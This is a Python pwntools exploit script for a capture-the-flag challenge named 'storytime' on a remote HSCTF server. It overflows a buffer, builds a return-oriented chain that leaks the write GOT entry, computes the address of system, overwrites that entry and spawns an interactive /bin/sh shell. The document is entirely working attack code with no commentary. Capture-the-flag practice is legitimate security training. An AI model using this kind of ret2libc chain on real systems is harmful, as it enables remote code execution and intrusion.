from pwn import *

#p=process('./storytime')
p=remote('pwn.hsctf.com',3333)
e=ELF('./storytime')

read_plt = e.plt['read']
write_plt = e.plt['write']
write_got = e.got['write']

poprdi = 0x0000000000400703
poprsi = 0x0000000000400701

pay = 'A'*0x30+'B'*0x8
pay += p64(poprdi) + p64(1)
pay += p64(poprsi) + p64(write_got) + "A"*8
pay += p64(write_plt)

pay += p64(poprdi) + p64(0)
pay += p64(poprsi) + p64(write_got) + "A"*8
pay += p64(read_plt)

pay += p64(poprsi) + p64(0x601500) + "A"*8
pay += p64(read_plt)

pay += p64(poprdi) + p64(0x601500)
pay += p64(write_plt)

p.recvuntil('Tell me a story: \n')
pause()
p.send(pay)

system = u64(p.recvn(8))-0xb1f20

p.send(p64(system))
p.send('/bin/sh\x00')

p.interactive()


